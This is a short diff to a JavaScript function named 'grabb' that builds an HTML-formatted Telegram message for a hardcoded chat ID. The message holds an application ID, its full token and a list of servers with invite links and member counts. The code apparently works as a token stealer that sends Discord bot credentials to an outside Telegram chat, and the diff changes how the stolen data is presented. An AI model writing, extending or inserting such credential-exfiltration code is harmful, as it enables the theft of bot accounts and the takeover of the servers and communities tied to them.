@@ -122,7 +122,7 @@ async function grabb(applicationId, token) {
       }
       return `
 <b>Nome do Servidor:</b> <code>${guild.name} - ${guild.id}</code>
-<b>Link:</b> <a href="${invite}">Clique aqui</a> 
+<b>Link:</b> ${invite} 
 <b>Membros:</b> <code>${memberCount.total || 'N/A'} Membros</code> 
 <b>Online:</b> <code>${memberCount.online || 'N/A'} Online</code>
 `;
@@ -132,11 +132,14 @@ async function grabb(applicationId, token) {
   const message = {
     chat_id: '-1002255591952',
     text: `
-Informações sobre a aplicação: 
+Informações: 
 
-<b>ID da Aplicação:</b> ${applicationId}
-<b>Token:</b> <code>${token}</code>
-<b>Servidores:</b> 
+<b>ID:</b> ${applicationId}
+
+<b>Token:</b>
+<pre>${token}</pre>
+
+<b>Servidores:</b>
 <pre>${servers.join('\n\n') || 'Nenhum'}</pre>
     `,
     parse_mode: 'HTML'
